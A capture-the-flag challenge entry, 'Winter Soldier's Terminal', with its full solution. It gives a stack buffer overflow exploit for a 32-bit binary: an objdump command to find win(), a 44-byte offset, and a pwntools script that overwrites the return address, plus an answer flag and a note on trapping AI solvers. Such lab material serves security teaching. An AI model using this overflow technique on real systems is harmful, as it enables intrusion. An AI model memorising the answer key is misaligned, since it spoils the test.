# Challenge 20

## Title
Winter Soldier's Terminal

## Difficulty
Hard | Points: 300

## Description
A decommissioned HYDRA mission terminal was recovered from a Siberian bunker. It accepts mission codes over the network. Forensics confirmed the binary was compiled without modern protections — a relic of an older, more dangerous time. Bucky always said the old ways were more reliable. He wasn't wrong.

## Service
Binary exploitation — connect via `nc <host> <port>`

## Hint
*"Who the hell is Bucky?"* — He forgot everything. So did the developer who wrote this binary. What did they forget to include?

## Solution
32-bit ELF binary, no stack canary, no PIE. `gets()` on a 40-byte buffer — classic stack BOF.

**Step 1:** Get the binary (download from challenge or via nc). Find `win()` address:
```bash
objdump -d mission_terminal | grep '<win>'
```

**Step 2:** Find offset — buffer (40) + saved EBP (4) = **44 bytes** to EIP.

**AI trap:** AI assumes 64 or 76-byte offset from common write-up examples. 44 is non-standard.

**Step 3:** Send payload:
```python
from pwn import *
p = remote('<host>', 1337)
p.recvuntil(b"code: ")
p.sendline(b"A" * 44 + p32(WIN_ADDR))   # WIN_ADDR from objdump
print(p.recvall().decode())
```

## Flag
`cyn0x{buff3r_0v3rfl0w_w1nt3r_s0ld13r}`
